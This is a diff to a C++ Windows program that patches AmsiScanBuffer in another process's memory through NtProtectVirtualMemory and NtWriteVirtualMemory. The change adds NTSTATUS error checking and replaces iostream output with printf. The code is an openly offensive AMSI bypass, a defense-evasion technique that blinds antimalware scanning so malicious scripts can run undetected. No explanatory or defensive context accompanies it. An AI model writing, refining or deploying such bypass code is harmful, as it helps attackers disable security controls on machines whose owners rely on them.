@@ -1,7 +1,10 @@
 #include <Windows.h>
-#include <iostream>
+#include <stdio.h>
 #pragma comment(lib, "ntdll")
-using namespace std;
+
+#ifndef NT_SUCCESS
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+#endif
 
 
 EXTERN_C NTSTATUS NtProtectVirtualMemory(
@@ -17,7 +20,6 @@ EXTERN_C NTSTATUS NtWriteVirtualMemory(
     IN PVOID Buffer,
     IN SIZE_T NumberOfBytesToWrite,
     OUT PSIZE_T NumberOfBytesWritten OPTIONAL);
-
 
 
 
@@ -79,12 +81,24 @@ void patchAMSI(HANDLE& hProc, int PatchNbr) {
 
     
 
-    NtProtectVirtualMemory(hProc, (PVOID*)&ptrAMSIaddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
-    NtWriteVirtualMemory(hProc, (LPVOID)AMSIaddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
-    NtProtectVirtualMemory(hProc, (PVOID*)&ptrAMSIaddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
-    std::cout << "\n\n[+] AmsiScanBuffer is Patched!\n\n";
-}
+    NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hProc, (PVOID*)&ptrAMSIaddr, (PSIZE_T)&memPage, 0x04, &OldProtect);
+    if (!NT_SUCCESS(NtProtectStatus1)) {
+        printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
+        return;
+    }
+    NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hProc, (LPVOID)AMSIaddr, (PVOID)amsiPatch, sizeof(amsiPatch), (SIZE_T*)nullptr);
+    if (!NT_SUCCESS(NtWriteStatus)) {
+        printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
+        return;
+    }
+    NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hProc, (PVOID*)&ptrAMSIaddr, (PSIZE_T)&memPage, OldProtect, &OldProtect);
+    if (!NT_SUCCESS(NtProtectStatus2)) {
+        printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
+        return;
+    }
 
+    printf("\n\n[+] AmsiScanBuffer is Patched!\n\n");
+}
 
 
 int main(int argc, char** argv) {
